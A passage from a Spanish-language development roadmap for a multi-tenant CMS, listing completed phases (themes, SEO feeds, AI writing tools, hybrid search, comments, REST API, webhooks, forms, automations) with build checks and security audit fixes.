  - **Newsletter**: serif Substack, columna 44rem, drop-cap, CTA suscripción
- [x] `getBuiltinTheme(slug)` con fallback a default
- [x] `src/themes/css.ts` — `themeCss(spec)`: genera `[data-csm-theme]` scope con tokens `--th-*` + alias de globals (`--background`, `--primary`, etc.) + `themeFontsLink(spec)` para fonts.bunny.net
- [x] `src/themes/active.ts` — `resolveTheme(ws,slug)`, `resolveActiveTheme(ws)`, `listAvailableThemes(ws)` con DB-or-builtin fallback

### Render público
- [x] `src/components/public/theme-shell.tsx` — server component que inyecta `<style>` + `<link>` fonts y wrappea con `data-csm-theme`
- [x] `src/components/public/public-nav.tsx` — nav themed con logo dinámico
- [x] `app/page.tsx` (CMS home) y catch-all `/[...slug]` envueltos
- [x] `/blog` con grid por tema (`grid-2`/`grid-3`/`feed-chrono`)
- [x] `/blog/[slug]` con layout dinámico (`narrow`/`magazine`/`wide`/`docs`/`minimal`) + ToC condicional + Subscribe CTA condicional
- [x] Toda la prose hereda el tema (Tailwind tokens aliased)

### Theme Studio (/admin/temas)
- [x] Galería con preview gradient + emoji + paleta strip
- [x] Estado "activo" + "aplicado"
- [x] Modal de previsualización full-screen con device toggle (mobile/tablet/desktop)
- [x] `applyThemeAction` con `revalidatePath("/", "layout")` + activity log
- [x] `/api/admin/theme-preview` route que renderiza HTML standalone con CSS del tema (X-Frame-Options: SAMEORIGIN)
- [x] Sidebar admin: nuevo item "Temas" con icono Palette

### SEO completo
- [x] `app/sitemap.ts` dinámico (home + pages publicadas + posts + autores con handle), revalidate 1h
- [x] `app/robots.ts` con disallows de /admin /api /onboarding /preview + sitemap link
- [x] `app/feed.xml/` RSS 2.0 con DC creator + atom self link, revalidate 10m
- [x] `app/feed.atom/` Atom 1.0 con xml:lang
- [x] `app/feed.json/` JSON Feed 1.1
- [x] `src/lib/feed.ts` payload builder compartido (50 items max)
- [x] Root metadata `alternates.types` apunta a los 3 feeds
- [x] JSON-LD Article (existente) + ProfilePage (autor) + CollectionPage (tag)

### OG dinámico por tema
- [x] `src/lib/og.tsx` — `renderOg({template, title, eyebrow, authorName, date, workspaceName})` con 3 layouts (centered/left/split)
- [x] `/api/og/article/[id]` lee tema activo del workspace del entry
- [x] `/api/og/page/[id]` mismo patrón para pages
- [x] `/api/og/default` usa workspace + tema activo
- [x] `/blog/[slug]` ahora usa `/api/og/article/{id}` en metadata

### Author pages + Tag archives
- [x] `src/lib/authors.ts` — `getAuthorByHandle`, `isValidHandle` (regex `[a-z0-9_-]`)
- [x] `app/autor/[handle]/page.tsx` themed con avatar + bio + website + twitter + JSON-LD ProfilePage
- [x] `src/lib/tags.ts` — `getTagPosts` joinea entryTerms+terms+taxonomies
- [x] `app/tag/[slug]/page.tsx` themed con grid + JSON-LD CollectionPage

### Verificación
- [x] `npx tsc --noEmit` cero errores
- [x] `npm run build` ✅ — 45 rutas, /admin/temas 3.47 kB, /autor/[handle] 176 B, /tag/[slug] 176 B, /suscribir 169 B, feeds estáticos 191 B
- [x] `npx biome check ./src` cero errores ni warnings (auto-fix aplicado)
- [x] Todas las rutas públicas (catch-all, /blog, /blog/[slug], /autor/[h], /tag/[s], /suscribir) usan ThemeShell + revalidate 60-300s

### Auditoría posterior — bugs detectados y fixeados
- [x] **Critical**: cross-tenant leak en `/autor/[handle]` → `getAuthorByHandle` ahora hace `innerJoin(members)` por workspaceId
- [x] **High**: `escapeXml`/`escapeCdata` no strippeaban control chars XML 1.0 ilegales → regex `ILLEGAL_XML_CHARS` aplicado antes del escape
- [x] **High**: Atom `<summary type="html">` con contenido text-escaped → cambiado a `type="text"`
- [x] **High**: theme-preview aceptaba slugs arbitrarios silenciosamente → 404 explícito si slug no es builtin ni custom
- [x] **High**: OG endpoints filtraban títulos de drafts → añadido `entries.status = 'published'` y `pages.status = 'published'`
- [x] **Medium**: `/suscribir` era 404 → stub themed con form deshabilitado y enlaces a feeds
- [x] **Medium**: alt vacío en logo del workspace → `alt={name}`
- [x] **Medium**: `resolveTheme` aceptaba `tokens={}` como custom → helper `hasValidTokens` con shape check
- [x] **Medium**: sitemap omitía `/tag/[slug]` y autores cross-tenant → añadidos tags + members join
- [x] **Low**: clean() en og.tsx no strippeaba bidi override chars → regex extendida con U+202A-202E + U+2066-2069
- [x] TODO(custom-domains) en `getDefaultPublicWorkspace`-equivalentes (sitemap, feed, og default)
- [x] Verificado y NO bug: JSON-LD escape `<`, escapeXml cobertura completa, getTagPosts multi-tenant, isUuid OG by-id, idempotencia applyThemeAction
- [x] `npx tsc --noEmit` cero errores tras fixes
- [x] `npm run build` ✅ tras fixes
- [x] `npx biome check ./src` cero errores tras fixes

## ✅ Fase 6 — IA + Búsqueda semántica + Comentarios ✦ Edición Espectacular (COMPLETA)

> Mejoras vs plan: 5 adapters de LLM (Groq/Anthropic/OpenAI/Mistral/Ollama) sin Vercel AI SDK (cero deps nuevas, fetch nativo + SSE/NDJSON parsers), mock determinista detecta intent y produce respuestas razonables sin clave, embeddings con OpenAI text-embedding-3-small + mock 1536-dim por hashing de bigramas (búsqueda semántica funciona sin clave), búsqueda híbrida con Reciprocal Rank Fusion + ts_headline snippets sanitizados, RAG con citas inline [1][2] linkadas a posts, smart internal linking validado contra texto literal del doc, voice dictation con Web Speech API + estructuración LLM, comentarios con honeypot + IP-hashing + score IA + heurística rápida, sidebar AI tab con sugerencias de enlaces.

### AI core (`src/ai/`)
- [x] `provider.ts` — adapter universal Groq/Anthropic/OpenAI/Mistral/Ollama; auto-detect; OpenAI-compatible para 3 providers, Anthropic native, Ollama NDJSON; mock determinista con intent detection (continue/improve/shorten/expand/translate/excerpt/title/alt/fix/outline/json)
- [x] `prompts.ts` — 12 acciones AI Inline curadas en español + 6 idiomas para translate; system prompts para JSON tasks (smart-link, voice structure, moderation, ask-csm)
- [x] `embeddings.ts` — OpenAI text-embedding-3-small (1536 dims) o mock determinista por bigramas hash + L2 normalize; helper `vectorToSql` para pgvector
- [x] `moderation.ts` — score 0-100 (heurística primero: links, mayúsculas, keywords spam, repeticiones, longitud) + LLM si pasa heurística
- [x] `actions.ts` — `runInlineAction`, `generateExcerptAction`, `suggestSeoTitleAction`, `suggestInternalLinksAction`, `structureVoiceAction`

### Schema upgrade
- [x] `comments` extendida: workspaceId (multi-tenant), blockId (anclaje inline futuro), authorUserId (logged-in users), userAgent, aiReason; índices `comments_ws_status_idx` y `comments_entry_idx`
- [x] `searchIndexJobs` (id, workspaceId, entryId, status enum queued/processing/done/error, attempts, error, timestamps); índices `search_jobs_entry_idx` único + `search_jobs_status_idx`
- [x] Tipos: `NewComment`, `SearchIndexJob`

### Búsqueda híbrida (`src/search/`)
- [x] `index.ts` — `ftsSearch` (BM25 + ts_rank_cd + ts_headline con snippets `<mark>`), `vectorSearch` (pgvector cosine `<=>`), `hybridSearch` (RRF k=60 con score normalizado), `ragRetrieve` (top-K passages para Ask CSM), `findLinkCandidates` (smart linking), `indexCoverage`
- [x] `jobs.ts` — `enqueueIndex` (upsert con onConflictDoUpdate), `processIndexJobs` (FOR UPDATE SKIP LOCKED + max 3 attempts + error tracking), `reindexWorkspace`
- [x] Hook en `saveEntryAction`: encolar embedding si charsDelta ≥ 50 OR título cambió; en `publishEntriesAction`: re-encolar todos los publicados

### Editor — AI Inline ⌘J
- [x] `ai-inline.tsx`: popover anclado a la selección con `coordsAtPos`, ajuste boundary derecha
- [x] 12 acciones agrupadas (Generar/Refinar/Tono/Traducir/SEO) + filtro live + ↑↓↵ navegación
- [x] Selector de idioma para "translate" (6 idiomas)
- [x] Streaming SSE desde `/api/admin/ai/inline` con preview shimmer
- [x] Modos list/running/result + accept (reemplaza selección) / insert below / retry / discard
- [x] Reemplazo seguro con `insertContentAt({from,to})` en Tiptap

### Voice-to-content
- [x] `voice-dictation.tsx`: Web Speech API (es-ES) con interim+final results, modal con transcript live
- [x] Tipos lite (sin DOM lib `webspeechapi`): SpeechRecognitionLite + Event variants
- [x] "Insertar tal cual" o "Estructurar con IA" → `structureVoiceAction` → headings + paragraphs Tiptap
- [x] Botón en barra de stats del editor (solo si supported)

### Sugerencias de enlaces internos
- [x] `suggestInternalLinksAction`: hybridSearch top-8 candidates → LLM JSON con anclas → validate literal en texto → fallback heurístico por título
- [x] AIPanel en SidePanel.tsx (tab "IA"): botón "Buscar sugerencias", lista con anclas y razón, botón "Aplicar" que mapea text-position a Tiptap pos y aplica `setLink`

### AI en SidePanel
- [x] Botón "Generar con IA" para excerpt (en publish y SEO description)
- [x] Botón "Sugerir con IA" para SEO title
- [x] Loading inline + toast feedback

### Búsqueda admin (`/admin/buscar`)
- [x] Server page con `requireWorkspace("author")` + `hybridSearch` + `indexCoverage`
- [x] SearchForm cliente con scope toggle Todo/Solo publicado, query con operadores tipo Google
- [x] ReindexBar con "Procesar lote" (POST /api/admin/ai/process-jobs) y "Re-encolar todo"
- [x] Resultados con scores FTS/vec/RRF + snippets `<mark>` sanitizados
- [x] Cobertura visual (X / Y indexadas + barra %)

### Búsqueda pública (`/buscar`)
- [x] ThemeShell + `getDefaultPublicWorkspace` + hybrid search scope=published
- [x] Form GET (cacheable) con `<input>` themed
- [x] Resultados linkados a `/blog/[slug]` con snippets

### Ask CSM (`/admin/ask` + `/api/admin/ai/ask`)
- [x] AskChat con streaming SSE, tipos de evento custom (`event: refs` para citaciones)
- [x] RAG: `ragRetrieve` top-5 → contexto numerado [1][2] → LLM con `askCsmSystem`
- [x] Citas inline clickables (renderizadas con regex `/\[\d+\]/`) → links a `/blog/[slug]`
- [x] Lista de fuentes al pie de cada respuesta
- [x] 4 prompts sugeridos cuando chat vacío
- [x] Stop button durante streaming

### Comentarios
- [x] `lib/comments.ts`: hashIp, createComment (autoclasificación por score → status), listApprovedForEntry (árbol parent→children), listForModeration, countByStatus, setStatus, deleteComments, getEntryForComment
- [x] `/api/comentarios` POST: Zod validate + honeypot + score IA + IP hashing + UA capture + revalidate `/blog/[slug]` si aprobado
- [x] `/admin/comentarios`: tabs por status con counts, ModerationList con bulk approve/spam/unapprove/delete + ConfirmDialog
- [x] CommentsSection (server) en /blog/[slug]: árbol con replies + RelativeTime
- [x] CommentForm (client) con campos + honeypot oculto + status feedback (approved/pending/spam)
- [x] Sidebar admin: nuevo item Comentarios con icono MessageSquare

### Route handlers
- [x] `POST /api/admin/ai/inline` — SSE streaming (action + selection + context + targetLang)
- [x] `POST /api/admin/ai/ask` — SSE con `event: refs` + texto + `event: done`
- [x] `POST /api/admin/ai/process-jobs?size=N` — procesa lote en background
- [x] `POST /api/comentarios` — público, anti-spam

### Sidebar admin
- [x] Buscar / Ask CSM / Comentarios añadidos (sin "pronto")

### Verificación
- [x] `npx tsc --noEmit` cero errores
- [x] `npm run build` ✅ — 51 rutas, /admin/ask 3.89 kB, /admin/buscar 3.22 kB, /admin/comentarios 3.71 kB, /admin/contenido/[id] 219 kB (+219 vs 219 — sin cambios) /api/admin/ai/* 204 B, /api/comentarios 204 B, /buscar 204 B
- [x] `npx biome check ./src` cero errores
- [x] Hooks de embedding en saveEntryAction + publishEntriesAction

### Auditoría posterior — bugs detectados y fixeados
- [x] **Critical**: `getEntryForComment(slug)` no filtraba por workspaceId → en multi-tenant un comentario podía guardarse contra el post equivocado si dos workspaces tienen el mismo slug. Fix: añadido `workspaceId` como primer parámetro y `getDefaultPublicWorkspace()` en el endpoint, con TODO(custom-domains).
- [x] **High**: `bodyText` en SidePanel era stale (solo se actualizaba al guardar). Las acciones IA (excerpt, título SEO, descripción, link suggestions) recibían texto viejo. Fix: en cada handler `editor?.getText() ?? bodyText` para tomar el contenido fresco.
- [x] **High**: `applyLink` en AIPanel usaba un mapping plain↔Tiptap-pos frágil con concat de "\n" entre bloques que no replica el comportamiento real de `textBetween("\n")` y descendía dos veces sobre los mismos nodos. Fix: rediseño con array de spans `{pos, text}` pre-calculados, busca en concatenación sin separador y mapea offset → doc-pos por cursor.
- [x] **High**: AIInlinePopover usaba `position: absolute` con coords de documento, pero su contenedor padre tiene `overflow-hidden` → posicionamiento incorrecto fuera del viewport. Fix: cambiado a `position: fixed` con coords de viewport + clamping en bordes (top/bottom/left) + flip-up si no cabe abajo.
- [x] **High**: AIInlinePopover no se reposicionaba al hacer scroll/resize → el popover quedaba "flotando" mientras el usuario movía el editor. Fix: useEffect con listeners scroll (capture-phase) + resize que recalculan `pos` mientras `open`.
- [x] **High**: Si el usuario abría AI Inline mientras un stream previo seguía corriendo, el stream viejo continuaba escribiendo a `setResult` (luego clobbered) y consumiendo tokens. Fix: `openPopover` ahora aborta cualquier `abortRef` previo antes de inicializar.
- [x] **Medium**: Si el LLM devolvía respuesta vacía, AI Inline pasaba a modo "result" con texto vacío y los botones de aplicar no hacían nada visible. Fix: chequeo `!finalResult.trim()` post-stream → toast de error y vuelve a list.
- [x] **Medium**: Comentarios huérfanos (parent eliminado/spam) no se renderizaban en el árbol porque `byParent.get(orphanedParentId)` devolvía undefined y el render solo iteraba `byParent.get(null)`. Fix: pre-calculo `idsPresent` y promociono a root cualquier reply cuyo parent no esté en items.
- [x] **Medium**: `comments.parentId` no tenía FK definida → al eliminar un comentario sus replies quedaban con `parentId` colgado. Fix: añadida FK self-ref con `onDelete: "set null"` (combinada con la promoción a root del CommentsSection, los replies sobreviven correctamente).
- [x] **Medium**: `userAgent` en createComment se truncaba a 200 chars; UAs reales son 300+. Fix: aumentado a 500.
- [x] **Medium**: `processIndexJobs` usaba `tx.execute(sql\`...FOR UPDATE SKIP LOCKED\`)` con cast `as unknown as { id: string }[]`, frágil al runtime según el driver. Fix: refactorizado a la API tipada de Drizzle `.for("update", { skipLocked: true })` (disponible en drizzle-orm 0.45+) — cero casts, cero raw SQL salvo el comparador `attempts < ${MAX_ATTEMPTS}`. Sustituí también `where sql\`id = ANY(${claimedIds})\`` por `inArray(searchIndexJobs.id, claimedIds)`.
- [x] **Low**: `void pos` en applyLink (variable muerta tras el rediseño). Eliminada con la refactorización.
- [x] Verificado y NO bug: multi-tenant isolation en hybridSearch / vectorSearch / ftsSearch / indexCoverage / listForModeration / setStatus / deleteComments — todas filtran workspaceId
- [x] Verificado y NO bug: ts_headline snippets — escape global + restore solo `<mark>` (XSS-safe; nested `<mark>` aceptable porque es tag inocua)
- [x] Verificado y NO bug: SQL injection — Drizzle parameterizado en todas las queries; `websearch_to_tsquery('spanish', ${q})` sanitiza el query
- [x] Verificado y NO bug: SSRF — todas las URLs de IA son hardcoded (api.groq, api.openai, api.anthropic, api.mistral, ollama)
- [x] Verificado y NO bug: comment body XSS — React escapa por defecto (sin dangerouslySetInnerHTML en body)
- [x] Verificado y NO bug: prompt injection moderación — el LLM responde JSON; tryParseJson falla y cae a heurística si el comentario inyecta instrucciones
- [x] Verificado y NO bug: rate-limit AI Inline — author logueado puede spammear (cost concern); aceptable para F6, hardening en F10
- [x] Verificado y NO bug: race en stream-then-close — abortRef.abort() libera el reader; AbortError silencioso
- [x] Verificado y NO bug: Tiptap insertContentAt con string — Tiptap parsea `\n` como saltos de párrafo; correcto para AI continuation
- [x] Verificado y NO bug: AskChat duplicate submit — `disabled={streaming}` previene doble click
- [x] Verificado y NO bug: comment honeypot bypass — devuelve 200 silencioso (no levanta sospechas), no guarda
- [x] Verificado y NO bug: voice dictation cleanup — useEffect cleanup aborta SpeechRecognition; modern React tolera setState tras unmount sin warning
- [x] Verificado y NO bug: enqueueIndex con DB null — early return ✓; saveEntryAction guard previo ✓
- [x] Verificado y NO bug: `pgvector` cosine de zero-vector — Postgres lo trata como distancia 1 (max), filtrado al final del ranking
- [x] `npx tsc --noEmit` cero errores tras los fixes
- [x] `npm run build` ✅ tras los fixes (51 rutas, mismas tamaños)
- [x] `npx biome check ./src` cero errores tras los fixes

## ✅ Fase 7a — Plataforma de APIs ✦ Edición Espectacular (COMPLETA)

> Mejoras vs plan: API keys con prefix legible (csm_live_/csm_test_), scopes regex (entries:*, *:read, *), rate-limit token-bucket en memoria, audit log per-request, idempotency-key con request hash + 24h TTL, ETag/304 en GETs, cursor pagination keyset, filter operators (?where[field][op]=), test environment que NO muta datos, REST runtime tipado con Zod schemas auto-registrando en OpenAPI 3.1 (sin libs externas), explorer "Try it" propio (no Stoplight), webhooks con HMAC SHA-256 + 5 reintentos exp + replay desde UI + test-firing + 12 tipos de eventos.

### Schema upgrade (10 tablas/cambios)
- [x] api_keys extendida: prefix unique, hash sha256+pepper, environment live/test, scopes[], rateLimit, expiresAt, revokedAt, rotatedFromId, requestsToday/Total, createdById
- [x] api_key_audit: per-request log (method, path, statusCode, durationMs, ipHash, ua, denyReason)
- [x] webhooks extendida: name, description, events[], maxAttempts, lastSuccess/FailureAt, createdById
- [x] webhook_deliveries: status enum (pending/success/failed/retrying/dropped), attempt, eventId, payload jsonb, statusCode, responseSnippet, durationMs, error, nextAttemptAt, sentAt
- [x] automations extendida: description, lastRunAt, runsTotal/Failed
- [x] automation_runs: triggerEvent, triggerPayload, status, output, error, durationMs
- [x] idempotency_keys: apiKeyId+key unique, requestHash, response cacheado, expiresAt 24h
- [x] env: API_KEY_PEPPER, CRON_SECRET

### API runtime (src/api/)
- [x] keys.ts: generateKey/hashSecret/parseKey/extractKeyFromRequest, cache TTL 60s, hasScope (glob), recordAudit, hashIp, CRUD (list/get/create/rotate/revoke/delete), resetDailyCounters, pruneExpiredKeys
- [x] rate-limit.ts: token-bucket en memoria con eviction, headers X-RateLimit-Limit/Remaining/Reset/Retry-After
- [x] errors.ts: ApiError tipado con códigos (unauthorized, forbidden, rate_limited, validation_error, idempotency_conflict, etc.)
- [x] query.ts: parseWhere/parseSort/parseFields/parseInclude, encode/decodeCursor, clauseToSql, sortToOrder, pickFields
- [x] schemas.ts: Zod schemas reutilizables (EntryResource, MediaResource, etc.) + paginatedResponseSchema
- [x] openapi.ts: registry global, zodToJsonSchema custom (subset 2020-12), buildOpenApiDocument 3.1 con security schemes + tags + examples
- [x] runtime.ts: createRoute orquesta auth + rate limit + scopes + parse + idempotency + ETag/304 + audit + ApiError → JSON. Body cap 1 MB. Soporta handler que devuelve `{etag, data}` o Response custom.

### REST endpoints v1 (15 rutas)
- [x] /api/v1/health (público, ping)
- [x] /api/v1/openapi.json (público, spec auto-generada)
- [x] /api/v1/me (info de la key actual)
- [x] /api/v1/entries (GET list cursor paginated, POST create)
- [x] /api/v1/entries/[id] (GET por id o slug, PATCH, DELETE)
- [x] /api/v1/entries/[id]/publish (POST)
- [x] /api/v1/collections (GET list)
- [x] /api/v1/collections/[slug] (GET por slug + entryCount)
- [x] /api/v1/media (GET list cursor paginated)
- [x] /api/v1/media/[id] (GET)
- [x] /api/v1/pages (GET list)
- [x] /api/v1/pages/[id] (GET)
- [x] /api/v1/comments (GET list)
- [x] /api/v1/comments/[id] (PATCH moderate)
- [x] /api/v1/taxonomies (GET list con terms)

### Admin UI (3 páginas nuevas)
- [x] /admin/api-keys: lista con badges live/test, requests-hoy/total, last-used; dialog crear con presets de scopes (sólo lectura / contenido / total) + checkboxes finos por recurso/acción + rate-limit + expiración; modal post-create reveal-once; rotar (24h grace) / revocar / eliminar
- [x] /admin/webhooks: lista con status badges (último OK/FALLO/retrying), counter de entregas; CRUD inline
- [x] /admin/webhooks/[id]: tabs Entregas / Probar / Configuración; replay por delivery; pausar/activar; rotar secret; test-fire por evento con payload sample
- [x] /admin/api-docs: explorer propio dark/light con sidebar agrupado por tag, búsqueda live, panel detalle con method/path/desc/scopes/params/body/response schemas auto-renderizados desde Zod, code samples curl/fetch/sdk con copy, "Try it" form con API key persistida (localStorage) + path-params + body editable + response renderizado con status code y duración. Sección "Verificar firmas de webhooks".
- [x] Sidebar: items API keys / Webhooks / Docs API añadidos

### Webhooks (src/webhooks/)
- [x] events.ts: 12 eventos catalogados con labels ES + 5 grupos UI + RETRY_DELAYS_MS [1s, 5s, 25s, 2m, 10m]
- [x] dispatcher.ts: emit() encola deliveries para subscriptions matching event o "*"; processDeliveries() con FOR UPDATE SKIP LOCKED + claim atómico, sendOne firma HMAC SHA-256 + safePublicFetch (SSRF-safe) + timeout 10s + response snippet 1KB; replayDelivery; testWebhook (sin guardar); pruneOldDeliveries (>30d)
- [x] lib.ts: listWebhooks con counter de deliveries y último status; getWebhookById; listDeliveries; CRUD; rotateWebhookSecret; countByEvent
- [x] Hooks emit() cableados en: saveEntryAction (entry.updated), publishEntriesAction (entry.published), unpublishEntriesAction (entry.unpublished), deleteEntriesAction (entry.deleted), savePageAction (page.published / page.unpublished con transición de estado), comments.createComment (comment.created), comments.setStatus (comment.approved / comment.spam), uploads route (media.uploaded)

### Cron endpoints (Vercel Cron)
- [x] /api/cron/_auth: timing-safe verify del CRON_SECRET (Bearer)
- [x] /api/cron/publish-scheduled: cada minuto, UPDATE entries scheduled→published con scheduledAt<=now, dispara webhook entry.published, revalidate /blog
- [x] /api/cron/webhooks-process: cada minuto, drena deliveries pendientes (max 25/batch)
- [x] /api/cron/daily: medianoche, resetDailyCounters + pruneExpiredKeys + pruneOldDeliveries
- [x] vercel.json con 3 crons configurados

### Verificación
- [x] npx tsc --noEmit cero errores
- [x] npm run build OK — 64 rutas (vs 51 en F6), /admin/api-docs 9.x kB, /admin/api-keys 7.x kB, /admin/webhooks 4.x kB, todos los /api/v1/* 243 B
- [x] npx biome check ./src cero errores ni warnings tras auto-fix (37 archivos formateados)

### Auditoría posterior — bugs detectados y fixeados
- [x] **Critical**: DoS por payload grande en runtime → cap de 1 MB (content-length header check + text length post-read)
- [x] **Critical**: createEntryHandler usaba apiKeys.id como entries.authorId (FK violation a users.id) → authorId queda null, audit log conserva apiKeyId
- [x] **Critical**: createEntryHandler creaba colecciones builtin para CUALQUIER slug → solo auto-crea posts/pages, custom collections deben existir (404 si no)
- [x] **High**: cron/publish-scheduled emitía webhooks falsos (SELECT then UPDATE race) → un solo UPDATE...RETURNING que sólo devuelve filas que transicionaron
- [x] **High**: publishEntriesAction y unpublishEntriesAction emitían webhooks duplicados al re-publicar → filter status != target en UPDATE + RETURNING
- [x] **High**: publishEntryHandler (REST) no detectaba "ya estaba publicada" → check existing status, retorna `alreadyPublished: true` si no transicionó
- [x] **Medium**: handlers REST entries/comments NO emitían webhooks (inconsistencia con admin actions) → emitAsync añadido en POST/PATCH/DELETE/publish/moderate
- [x] **Medium**: processDeliveries NO filtraba webhookId por workspaceId al cargar secret → doble filtro defensivo `and(eq(id), eq(workspaceId))`
- [x] **Medium**: testWebhookAction aceptaba event arbitrario → `z.enum(WEBHOOK_EVENTS)` en lugar de string
- [x] **Medium**: runtime devolvía body vacío con content-type JSON si handler retornaba undefined → `JSON.stringify(result ?? null)`
- [x] **Low**: denyReasonToMessage siempre devolvía "unauthorized" para todos los códigos → simplificado
- [x] **Low**: setTimeout en sendOne no se limpiaba si fetch lanzaba → clearTimeout en finally
- [x] **Low**: replayDeliveryAction no validaba UUID → validación con Zod
- [x] **Cleanup**: prop `spec` en api-docs page no se usaba → removido (la spec se consume vía /api/v1/openapi.json)
- [x] Verificado y NO bug: timing-safe en verifyKey (timingSafeEqual con buffers de igual longitud), prefix collision (índice unique 32 bits + crypto.randomBytes), cross-tenant en handlers REST (todos filtran por ctx.workspaceId que viene de la key), cross-tenant en server actions admin (todos usan requireWorkspace + workspaceId filter), SSRF en webhook delivery URL (safePublicFetch), HMAC verify timing-safe, idempotency-key reuse con body distinto → 409, audit fail-safe (try-catch), test environment NO muta, scopes glob seguro (sin regex injection), CRON_SECRET timing-safe, response snippet capped 1 KB, FOR UPDATE SKIP LOCKED para evitar dobles deliveries, prune cron limita acumulación, openapi.json público no expone datos del workspace, crons idempotentes (UPDATE...WHERE...RETURNING)

## ✅ Fase 7b — Forms + Automations ✦ Edición Espectacular (COMPLETA)

> Mejoras vs plan: form schema discriminado fuerte (16 tipos de field), conditional logic visible/required compartida cliente+server, multi-step con barra de progreso, anti-spam multicapa (honeypot estable+random / time-trap / heurística URLs+TLDs+UA / hCaptcha+Turnstile opcional), double opt-in con HMAC SHA-256 firmado y verify timing-safe, hash idempotente sha-256 sobre data canónica como índice unique, CSV+JSON export con paginación, 5 plantillas pre-built de forms, embed snippets (iframe + fetch + REST), CORS allowedOrigins por form, rate-limit token-bucket por IP+form (hourly+daily). Automations engine con templating `{{trigger.payload.x}}` y `{{steps.N.output.y}}` (con prototype-pollution guard), 11 tipos de action (webhook, email, slack, ai-summarize/classify/extract_json, http, db.entry.create/update, db.subscriber.add, db.comment.create, sleep, branch), engine soporta defer (sleep) y resume tras crash via cron, claim atómico anti-doble-ejecución, dryRun para test, listener cableado a webhook dispatcher (auto-trigger event-based), trigger types event/form_submit/cron/webhook_in/manual, webhook_in con secret HMAC timing-safe, 5 plantillas pre-built de automations.

### Schema upgrade
- [x] forms ampliada: status (draft/published/archived) + version + settings (jsonb) + notificationEmails[] + submissionsCount + spamCount + lastSubmissionAt + redirectUrl + createdById + updatedAt; índices ws_slug + ws_status
- [x] form_versions nueva: snapshot inmutable del schema por version (formId, version) unique
- [x] submissions ampliada: workspaceId + formVersion + status (received/spam/processed/archived) + spamScore + spamReasons + contentHash (unique con formId) + attachments uuid[] + referer + country + source jsonb (utm) + confirmedAt + confirmationToken (unique)
- [x] automations ampliada: slug unique + triggerType enum + debounceMs + webhookSecret + índice trigger_type
- [x] automation_runs ampliada: nextStepAt + nextStepIndex + context jsonb (snapshot + steps outputs); índice pending
- [x] automation_steps nueva: log granular por step (runId, stepIndex, type, status, input, output, error, durationMs)
- [x] enums: form_status, submission_status, automation_trigger_type, automation_step_status

### Forms engine (src/forms/)
- [x] types.ts: 16 tipos discriminados (text/email/url/tel/textarea/number/select/multiselect/checkbox/radio/date/file/rating/signature/hidden/section/heading/divider/payment), VisibleCondition, FormStep, FormSettings con defaults
- [x] conditional.ts: isVisible() — evaluador shared cliente+server con 9 operadores (eq/neq/in/not_in/contains/empty/not_empty/gt/lt)
- [x] schema-builder.ts: buildSubmissionSchema() construye Zod dinámico con superRefine para required+visibleIf cruzado; sanitize() descarta keys de campos invisibles
- [x] anti-spam.ts: scoreSubmission() honeypot + time-trap + UA bot + TLD sospechoso + URLs múltiples + repetición de chars; SPAM_THRESHOLD 60
- [x] tokens.ts: signConfirmationToken/verifyConfirmationToken HMAC SHA-256 base64url + timing-safe; reusa API_KEY_PEPPER
- [x] rate-limit.ts: token-bucket en memoria por IP+formId con eviction; hourly+daily
- [x] lib.ts: CRUD de forms, listForms/getById/getBySlug/getPublishedBySlug, publishForm con version bump + form_versions snapshot, submissions list (cursor) + status update + bulk delete + countByForm + computeContentHash + submissionsToCsv
- [x] submit.ts: processSubmission() orquestador con 10 pasos + confirmSubmission() + onSubmissionConfirmed (webhook + emails + automations + legacy webhookUrl) + verifyCaptcha (hcaptcha/turnstile) + filterOwnedMediaIds (cross-tenant)
- [x] templates.ts: 5 plantillas (Contacto, Newsletter, NPS con conditional, Demo multi-step, Soporte con file)

### Public API (src/app/api/public/forms/[slug]/)
- [x] GET /schema: devuelve schema sanitizado (sin notificationEmails, sin webhookUrl); CORS por allowedOrigins; cache 60s
- [x] POST /submit: acepta JSON / form-encoded / multipart; cap 256 KB; rate-limit por IP; status codes 201/200/422/429/403/413; respuesta silenciosa para spam (200 sin revelar)
- [x] OPTIONS preflight para ambos
- [x] GET /confirm?token=...: HTML standalone con styles inline para email-friendly

### Admin UI Forms (src/app/admin/forms/)
- [x] /admin/forms: lista con badges de status, counts de envíos y spam, last-submission-time
- [x] /admin/forms/[id]: builder split-pane 260+1fr+320px — paleta agrupada (Entrada/Elección/Avanzados/Diseño) + canvas dnd-kit sortable + inspector dinámico por field
- [x] Multi-step toggle "convertir en multi-step" + add/remove pasos + asignación de fields a paso
- [x] Conditional editor (mostrar si): all/any modo, 9 operadores, valores parsed por op
- [x] Live preview tab con test-submit que llama a action server (no expone form al exterior)
- [x] Publish con confirm dialog + version bump
- [x] /admin/forms/[id]/submissions: tabla filtrable por status + búsqueda + bulk actions (procesar/archivar/spam/eliminar) + modal detalle + spam reasons
- [x] /admin/forms/[id]/submissions/export?format=csv|json: streaming export hasta 10k rows
- [x] /admin/forms/[id]/settings: General + Tras envío + Notificaciones + Anti-spam (toggles + límites IP + CORS allowedOrigins) + Zona de peligro (archivar/eliminar)
- [x] /admin/forms/[id]/embed: snippets iframe + URL schema + URL submit + ejemplo fetch con copy-to-clipboard
- [x] Layout con tabs (Editor / Envíos / Ajustes / Embed) + ver-público + back-button
- [x] Sidebar item Formularios añadido en sección Crecer (con icon ClipboardList)

### Renderer público (src/app/forms/[slug]/)
- [x] Página SSR con metadata + título + descripción
- [x] Cliente con buildDefaultValues + validación step-side + multi-step navigation + barra de progreso gradient
- [x] Honeypot oculto absolute -9999px + csm_t epoch ms en submit
- [x] Estados editing/submitting/success/needs_confirmation/error con UIs distintas
- [x] Soporta redirectUrl (window.location.href) tras success
- [x] Footer "Powered by CSM"

### FieldRenderer compartido (src/components/forms/)
- [x] Renderiza 16 tipos de field; conditional aplicado; modo disabled; errores inline
- [x] Section/Heading/Divider display-only sin value
- [x] Rating con stars hover; Multiselect como chips; File como UUID stub; Signature como base64 stub

### Automations engine (src/automations/)
- [x] types.ts: 11 step types (WebhookStep, EmailStep, SlackStep, AiStep, HttpStep, DbEntry create/update, DbSubscriberAdd, DbCommentCreate, SleepStep, BranchStep) + Trigger discriminado (event/form_submit/cron/webhook_in/manual) + STEP_GROUPS catalogados para UI
- [x] templating.ts: renderTemplate `{{path}}` con prototype-pollution guard (__proto__/constructor/prototype bloqueados); renderObject recursivo; evalCondition + evalConditions (all/any)
- [x] actions.ts: registry de actions con SSRF-safe fetch, AI vía chat() de provider.ts (groq/anthropic/openai/mistral con mock fallback), DB ops con workspaceId enforced, timeouts 15s
